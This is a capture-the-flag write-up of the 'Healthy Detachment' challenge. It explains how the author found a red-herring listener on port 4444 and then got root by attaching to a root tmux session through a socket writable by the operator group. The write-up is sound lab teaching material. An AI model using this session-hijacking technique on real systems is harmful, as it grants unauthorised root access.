Healthy Detachment
===

IWC Pre-DEFCON Challenge

By DisplayGFX

Yet another challenge where we ssh into a user. This time it is `admin`

## Initial enumeration

Lets look at the files in the home directory.

```bash
admin@node-cafe:~$ ls -la
total 24
drwxr-x--- 2 admin admin 4096 Jul 31 17:33 .
drwxr-xr-x 1 root  root  4096 Jul 31 17:33 ..
-rw-r--r-- 1 admin admin  220 Jul 31 17:33 .bash_logout
-rw-r--r-- 1 admin admin 3771 Jul 31 17:33 .bashrc
-rw-r--r-- 1 root  root    21 Jul 31 17:33 .history
-rw-r--r-- 1 admin admin  807 Jul 31 17:33 .profile
```

Well, lets read what the files contain. To save space on this document, every other file contains not much. But `.history` contains this.
# A Red Herring

```bash
admin@node-cafe:~$ cat .history 
r00k wuz h3r3
man nc
```

`nc` is a classic tool, netcat. This basically gives the hint to look at the open ports. A fun fact while going through this challenge: you dont need `ps` to look at the open ports. All you need to do is to read `/proc/net/tcp`.
```bash
admin@node-cafe:~$ cat /proc/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 0100007F:115C 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 5483547 1 0000000000000000 100 0 0 10 0
```

The addresses are encoded in hex, but `115c` is port 4444 in decimal, and `0100007F` will (when split among bytes) result in `1 0 0 127`. the address of localhost in little endian order.

Lets connect to it!

```bash
admin@node-cafe:~$ nc localhost 4444
Thank you, User! But your backdoor is in another castle!
dang
admin@node-cafe:~$ 
```

Ah, a red herring.

## The real solution: Tmux

Well, clearly it must be running on the machine, so lets take a look at whats active.

```bash
admin@node-cafe:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2800  1664 ?        Ss   04:08   0:00 /bin/sh -c /root/entry.sh
root           7  0.0  0.0   4324  3328 ?        S    04:08   0:00 /bin/bash /root/entry.sh
root          10  0.0  0.0   9788  4160 ?        Ss   04:08   0:00 tmux new -d
root          11  0.0  0.0   4588  3840 pts/0    Ss+  04:08   0:00 -bash
root          17  0.0  0.0  15480 10752 ?        S    04:08   0:00 python3 /root/ganon.py localhost 4444
root          21  0.0  0.0   2728  1408 ?        S    04:08   0:00 tail -f /dev/null
admin         22  0.0  0.0   4588  3968 pts/1    Ss   04:08   0:00 /bin/bash
admin         31  0.0  0.0   7888  3968 pts/1    R+   04:09   0:00 ps aux
```

There is the port that is open. But wait, I dont have any tmux sessions running! Whats going on here?

Well, if you start your own tmux session, you can see what is happening in `/tmp`.

```bash
admin@node-cafe:~$ ls -la /tmp
total 16
drwxrwxrwt 1 root  root     4096 Aug  1 04:34 .
drwxr-xr-x 1 root  root     4096 Aug  1 04:34 ..
drwxrwx--- 2 root  operator 4096 Aug  1 04:34 tmux-0
admin@node-cafe:~$ tmux
[in the tmux session]
admin@node-cafe:~$ ls -la /tmp
total 16
drwxrwxrwt 1 root  root     4096 Aug  1 04:34 .
drwxr-xr-x 1 root  root     4096 Aug  1 04:34 ..
drwxrwx--- 2 root  operator 4096 Aug  1 04:34 tmux-0
drwx------ 2 admin admin    4096 Aug  1 04:40 tmux-1002
[exit tmux]
```

There must be a session. If you run `env`, you can see how it is handled in a tmux session itself.

```bash
admin@node-cafe:~$ env
SHELL=/bin/bash
TERM_PROGRAM_VERSION=3.4
TMUX=/tmp/tmux-1002/default,32,0
HOSTNAME=node-cafe
env_priv_user=admin
PWD=/home/admin
HOME=/home/admin
LS_COLORS=....
TERM=tmux-256color
TMUX_PANE=%0
env_low_user=dev
SHLVL=2
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
TERM_PROGRAM=tmux
_=/usr/bin/env
```

Pay attention to the `TMUX` variable.  There is the path, and if we check with `ps aux`, that is the process tmux is running on. We dont need to concern ourselves with that, we can just set `TMUX` to the open session, and maybe we can use something called `attach-session`

> attach-session \[-dErx] \[-c working-directory] \[-f flags] \[-t target-session]
                     (alias: attach)
			If run from outside tmux, create a new client in the current terminal and attach it to target-session. If used from inside, switch the current client.  If -d is specified, any other clients attached to the session are detached.  If -x is given,  send  SIGHUP to the parent process of the client as well as detaching the client, typically causing it to exit.  -f sets a comma-separated list of client flags.

This should allow us to connect to the ongoing session! Why? Because we have permissions, as being part of the operators group.

```bash
admin@node-cafe:~$ groups
admin operator users
```

## Exploit
```
admin@node-cafe:~$ export TMUX=/tmp/tmux-0/default
admin@node-cafe:~$ tmux attach-session
[tmux session]
root@node-cafe:/# 
root@node-cafe:/# cat /flag.txt 
```

And that gets us the flag!